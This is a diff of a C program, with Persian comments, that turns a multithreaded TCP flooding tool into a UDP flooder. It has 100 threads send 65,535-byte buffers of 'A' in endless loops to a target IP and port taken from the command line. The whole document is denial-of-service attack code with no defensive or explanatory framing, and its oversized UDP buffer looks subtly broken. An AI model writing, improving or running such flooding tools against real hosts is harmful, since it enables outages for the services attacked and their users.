@@ -3,56 +3,33 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
 #include <pthread.h>
 #include <unistd.h>
 
 #define BUFFER_SIZE 65535
-#define THREAD_COUNT 500
+#define THREAD_COUNT 100
 
-// محاسبه Checksum
-unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
-    unsigned long sum = 0;
-    while (nbytes > 1) {
-        sum += *ptr++;
-        nbytes -= 2;
-    }
-    if (nbytes == 1) {
-        sum += *(unsigned char *)ptr;
-    }
-    sum = (sum >> 16) + (sum & 0xFFFF);
-    sum += (sum >> 16);
-    return (unsigned short)(~sum);
-}
+void *send_udp_packets(void *arg) {
+    char *target_ip = ((char **)arg)[0];
+    int target_port = atoi(((char **)arg)[1]);
 
-// ارسال بسته‌های حجیم
-void *send_packets(void *arg) {
-    char *target_ip = (char *)arg;
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
-        perror("خطا در ایجاد سوکت");
+        perror("خطا در ایجاد سوکت UDP");
         pthread_exit(NULL);
     }
 
     struct sockaddr_in target_addr;
     target_addr.sin_family = AF_INET;
-    target_addr.sin_port = htons(80);
+    target_addr.sin_port = htons(target_port);
     inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
 
-    if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
-        perror("اتصال به سرور ناموفق بود");
-        close(sock);
-        pthread_exit(NULL);
-    }
-
     char buffer[BUFFER_SIZE];
-    memset(buffer, 'A', BUFFER_SIZE);
+    memset(buffer, 'A', BUFFER_SIZE); // پر کردن داده با 'A'
 
     while (1) {
-        if (send(sock, buffer, BUFFER_SIZE, 0) < 0) {
-            perror("خطا در ارسال داده");
+        if (sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
+            perror("خطا در ارسال بسته");
         }
     }
 
@@ -61,15 +38,16 @@ void *send_packets(void *arg) {
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 2) {
-        printf("استفاده: %s <آدرس IP مقصد>\n", argv[0]);
+    if (argc < 3) {
+        printf("استفاده: %s <آدرس IP مقصد> <پورت مقصد>\n", argv[0]);
         return 1;
     }
 
     pthread_t threads[THREAD_COUNT];
+    char *args[2] = {argv[1], argv[2]}; // پارامترهای IP و پورت
 
     for (int i = 0; i < THREAD_COUNT; i++) {
-        pthread_create(&threads[i], NULL, send_packets, argv[1]);
+        pthread_create(&threads[i], NULL, send_udp_packets, args);
     }
 
     for (int i = 0; i < THREAD_COUNT; i++) {
